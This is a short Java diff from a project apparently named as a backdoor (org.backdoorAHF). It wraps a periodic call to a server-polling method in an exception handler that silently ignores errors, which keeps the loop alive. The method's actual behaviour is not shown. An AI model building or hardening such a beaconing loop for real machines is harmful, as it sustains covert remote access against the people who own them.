@@ -22,7 +22,11 @@ public class App
 				Thread.sleep(5000);
 			} catch (InterruptedException e) {
 			}
-    	org.backdoorAHF.service.Conection.questionToServer();
+    	    try {
+    	    	org.backdoorAHF.service.Conection.questionToServer();
+			} catch (Exception e) {
+			}
+    	
     		}
     	
  
